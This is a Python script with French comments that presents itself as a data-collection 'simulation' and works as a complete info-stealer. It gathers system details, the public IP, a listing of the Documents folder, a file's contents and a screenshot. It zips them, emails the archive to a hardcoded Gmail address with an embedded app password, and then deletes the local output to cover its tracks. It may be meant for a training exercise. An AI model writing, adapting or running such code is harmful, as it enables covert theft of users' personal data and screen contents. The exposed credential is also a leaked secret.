import os
import platform
import socket
import getpass
import requests
from datetime import datetime
from email.message import EmailMessage
import smtplib
import pyautogui
import time
import shutil
import zipfile

# === 📦 FONCTIONS DE COLLECTE ===

def get_system_info():
    return {
        "Nom utilisateur": getpass.getuser(),
        "Nom machine": socket.gethostname(),
        "IP locale": socket.gethostbyname(socket.gethostname()),
        "OS": platform.system(),
        "Version OS": platform.version(),
        "Répertoire actuel": os.getcwd(),
        "Date/Heure": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Non disponible"

def list_documents():
    try:
        path = os.path.expanduser("~/Documents")
        return os.listdir(path)
    except:
        return ["Impossible de lister le dossier Documents"]

def read_sample_file():
    try:
        with open("fichier_test.txt", "r", encoding="utf-8") as f:
            return f.read()
    except:
        return "Fichier non trouvé"

def take_screenshot(output_path):
    screenshot = pyautogui.screenshot()
    screenshot.save(output_path)
    return output_path

# === 📤 EXFILTRATION / ENVOI ===

def notify_listener():
    try:
        requests.get("http://localhost:5000/notify")
    except:
        pass  # Le listener peut ne pas être actif

def send_email(sender, password, receiver, attachments):
    msg = EmailMessage()
    msg["Subject"] = "Simulation - Données collectées"
    msg["From"] = sender
    msg["To"] = receiver
    msg.set_content("Voici les données collectées durant la simulation.")

    for file in attachments:
        with open(file, "rb") as f:
            msg.add_attachment(
                f.read(),
                maintype="application",
                subtype="octet-stream",
                filename=os.path.basename(file)
            )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(sender, password)
        smtp.send_message(msg)

# === 🧠 TRAITEMENT & ARCHIVAGE ===

def save_info_to_file(data, path):
    with open(path, "w", encoding="utf-8") as f:
        for k, v in data.items():
            f.write(f"{k}: {v}\n")
    return path

def copy_target_file(source, dest):
    if os.path.exists(source):
        shutil.copy2(source, dest)
        return dest
    else:
        return None

def create_output_folder():
    output_dir = os.path.join(os.getcwd(), "output")
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def zip_output(folder_path, output_zip):
    with zipfile.ZipFile(output_zip, 'w') as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, folder_path)
                zipf.write(full_path, arcname=arcname)
    return output_zip

# === 🧪 MAIN ===

def main():
    time.sleep(2)

    output_dir = create_output_folder()

    # 1. Collecte d'infos système
    infos = get_system_info()
    infos["IP publique"] = get_public_ip()
    infos["Fichiers Documents"] = ", ".join(list_documents())
    infos["Contenu test.txt"] = read_sample_file()
    
    info_path = os.path.join(output_dir, "info.txt")
    screenshot_path = os.path.join(output_dir, "capture.png")
    copied_file_path = os.path.join(output_dir, "copie_fichier_test.txt")

    save_info_to_file(infos, info_path)
    take_screenshot(screenshot_path)
    copy_target_file("fichier_test.txt", copied_file_path)

    notify_listener()

    # 2. Archivage
    zip_name = f"rapport_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    zip_path = os.path.join(os.getcwd(), zip_name)
    zip_output(output_dir, zip_path)

    # 3. Envoi email
    send_email(
        sender="oguerep@gmail.com",
        password="ojjuztyzrtiycmtg",  # mot de passe d’application Gmail
        receiver="oguerep@gmail.com",
        attachments=[zip_path]
    )

    # Nettoyage
    shutil.rmtree(output_dir)
    os.remove(zip_path)

if __name__ == "__main__":
    main()